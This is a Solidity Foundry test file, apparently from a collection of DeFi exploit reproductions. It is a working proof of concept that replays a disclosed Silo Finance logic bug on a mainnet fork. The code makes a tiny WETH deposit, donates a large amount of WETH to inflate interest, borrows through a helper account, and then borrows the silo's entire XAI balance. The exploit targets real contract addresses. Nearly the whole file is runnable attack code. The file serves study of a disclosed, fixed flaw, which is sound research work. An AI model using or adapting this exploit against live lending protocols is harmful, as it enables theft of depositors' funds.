pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./../interface.sol";

// It's a postmortem, now it's disclosed, just for studying.
// analysis and code: https://medium.com/immunefi/silo-finance-logic-error-bugfix-review-35de29bd934a

interface ISilo {
    function deposit(
        address _asset,
        uint256 _amount,
        bool _collateralOnly
    ) external returns (uint256 collateralAmount, uint256 collateralShare);

    function borrow(address _asset, uint256 _amount) external returns (uint256 debtAmount, uint256 debtShare);

    function assetStorage(address _asset) external view returns (IBaseSilo.AssetStorage memory);

    function accrueInterest(address _asset) external returns (uint256 interest);
}

interface IBaseSilo {
    /// @dev Storage struct that holds all required data for a single token market
    struct AssetStorage {
        /// @dev Token that represents a share in totalDeposits of Silo
        IShareToken collateralToken;
        /// @dev Token that represents a share in collateralOnlyDeposits of Silo
        IShareToken collateralOnlyToken;
        /// @dev Token that represents a share in totalBorrowAmount of Silo
        IShareToken debtToken;
        /// @dev COLLATERAL: Amount of asset token that has been deposited to Silo with interest earned by depositors.
        /// It also includes token amount that has been borrowed.
        uint256 totalDeposits;
        /// @dev COLLATERAL ONLY: Amount of asset token that has been deposited to Silo that can be ONLY used
        /// as collateral. These deposits do NOT earn interest and CANNOT be borrowed.
        uint256 collateralOnlyDeposits;
        /// @dev DEBT: Amount of asset token that has been borrowed with accrued interest.
        uint256 totalBorrowAmount;
    }
}

interface IShareToken {}

contract OtherAccount {
    ISilo immutable SILO;
    IERC20 public constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 public constant LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);

    address owner;

    constructor(ISilo _silo) {
        owner = msg.sender;
        SILO = _silo;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function depositLinkAndBorrowWETH() external onlyOwner {
        // This will inflate the ETH interest rate.
        uint256 depositAmount = LINK.balanceOf(address(this));
        LINK.approve(address(SILO), depositAmount);
        SILO.deposit(address(LINK), depositAmount, true);
        SILO.borrow(address(WETH), 1 ether);
        WETH.transfer(owner, 1 ether); // Return the borrowed amount to the exploit contract
    }
}

contract SiloBugFixReview {
    ISilo public constant SILO = ISilo(0xcB3B879aB11F825885d5aDD8Bf3672596d35197C);
    IERC20 public constant XAI = IERC20(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc);
    IERC20 public constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 public constant LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);

    OtherAccount public immutable otherAccount;

    constructor() {
        otherAccount = new OtherAccount(SILO);
    }

    modifier checkZeroAssetStorage() {
        require(SILO.assetStorage(address(WETH)).totalDeposits == 0);
        _;
    }

    function run() external checkZeroAssetStorage {
        uint256 accrueInterest = SILO.accrueInterest(address(WETH));

        console.log("Balance of XAI before exploit= ", XAI.balanceOf(address(this)));
        console.log("WETH interest rate before exploit = ", accrueInterest);

        uint256 depositAmount = 1e5;
        uint256 donatedAmount = 1e18;

        WETH.approve(address(SILO), depositAmount);
        SILO.deposit(address(WETH), depositAmount, false);

        WETH.transfer(address(SILO), donatedAmount);

        otherAccount.depositLinkAndBorrowWETH();
    }

    function run2() external {
        uint256 accrueInterest = SILO.accrueInterest(address(WETH));
        SILO.borrow(address(XAI), XAI.balanceOf(address(SILO)));

        console.log("Balance of XAI after exploit= ", XAI.balanceOf(address(this)));
        console.log("WETH interest rate after exploit = ", accrueInterest);
    }
}

// forge test --match-path test/pocs/posterms/silo-finance/BugFixReview.t.sol -vvv
contract SiloBugFixReviewTest is Test {
    uint256 mainnetFork;

    SiloBugFixReview public siloBugFixReview;

    uint256 constant depositAmount = 1e5;
    uint256 constant donatedAmount = 1e18;

    uint256 otherAccountDepositAmount = 545 * 1e18;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 17_139_470);

        siloBugFixReview = new SiloBugFixReview();
        deal(address(siloBugFixReview.WETH()), address(siloBugFixReview), depositAmount + donatedAmount);
        deal(address(siloBugFixReview.LINK()), address(siloBugFixReview.otherAccount()), otherAccountDepositAmount);
    }

    function testAttack() public {
        address LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;

        address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

        console.log("time stamp before = ", block.timestamp);
        console.log("block number before = ", block.number);
        siloBugFixReview.run();
        cheats.makePersistent(address(siloBugFixReview));
        cheats.makePersistent(address(siloBugFixReview.SILO()));

        cheats.makePersistent(WETH);
        cheats.makePersistent(address(siloBugFixReview.SILO().assetStorage(WETH).collateralToken));
        cheats.makePersistent(address(siloBugFixReview.SILO().assetStorage(WETH).collateralOnlyToken));
        cheats.makePersistent(address(siloBugFixReview.SILO().assetStorage(WETH).debtToken));

        cheats.makePersistent(LINK);
        cheats.makePersistent(address(siloBugFixReview.SILO().assetStorage(LINK).collateralToken));
        cheats.makePersistent(address(siloBugFixReview.SILO().assetStorage(LINK).collateralOnlyToken));
        cheats.makePersistent(address(siloBugFixReview.SILO().assetStorage(LINK).debtToken));

        cheats.rollFork(block.number + 1);

        console.log("time stamp after = ", block.timestamp);
        console.log("block number after = ", block.number);
        siloBugFixReview.run2();
    }
}
